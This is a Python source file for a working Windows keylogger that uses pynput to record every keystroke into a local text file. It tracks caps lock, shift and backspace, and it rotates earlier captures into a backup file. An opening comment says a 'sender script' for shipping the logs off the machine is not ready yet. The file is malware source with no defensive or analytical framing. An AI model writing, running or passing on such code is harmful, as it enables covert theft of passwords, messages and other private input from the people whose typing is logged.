#Will bbe saving in this system only as sender script is not ready yet
from pynput.keyboard import Listener, Key
import ctypes
shifted_characters = {
    '1': '!', '2': '@', '3': '#', '4': '$', '5': '%', '6': '^',
    '7': '&', '8': '*', '9': '(', '0': ')', '-': '_', '=': '+',
    '[': '{', ']': '}', '\\': '|', ';': ':', "'": '"', ',': '<',
    '.': '>', '/': '?', '`': '~'
}
with open("keystroke.txt") as f3:
    e = f3.read()
with open("keystroke.txt", "w") as f5:
    str1 = ""
    f5.write(str1)
with open("keystroke_backup.txt", "a") as f4:
    str = "\n"
    str += e
    f4.write(str)
def capslock():
    return ctypes.windll.user32.GetKeyState(0x14) & 1
written_chars = []
shift_pressed = False
def on_press(key):
    global written_chars, shift_pressed
    with open("keystroke.txt", "a") as log_file:
        try:
            
            if hasattr(key, 'char') and key.char is not None:
                if capslock() == 1:
                    
                    written_chars.append(key.char.upper())
                    log_file.write(f"{key.char.upper()}")
                else:
                    
                    written_chars.append(key.char)
                    log_file.write(f"{key.char}")
            
            
            elif key == Key.shift_r or key == Key.shift_l:
                shift_pressed = True  
            
            elif key == Key.space:
                written_chars.append(' ')
                log_file.write(" ")
            elif key == Key.backspace:
                if written_chars:
                    written_chars = written_chars[:-1]
                    str = ""  
                    str = ''.join(written_chars)
                    with open("keystroke.txt", "w") as f1:
                        f1.write(str)  
            elif key == Key.enter:
                written_chars.append("\n")
                log_file.write("\n")              

            
        except AttributeError:
            if key == Key.caps_lock:
                pass  
            
            elif key == Key.shift_r or key == Key.shift_l:
                pass 
            elif key == Key.enter:
                pass 
            else:
                log_file.write(f" {key} ")  

        
        if shift_pressed:
            if hasattr(key, 'char') and key.char is not None:
                if key.char in shifted_characters:
                    
                    written_chars.append(shifted_characters[key.char])
                    log_file.write(f"{shifted_characters[key.char]}")
            shift_pressed = False  



with Listener(on_press=on_press) as listener:
    listener.join()
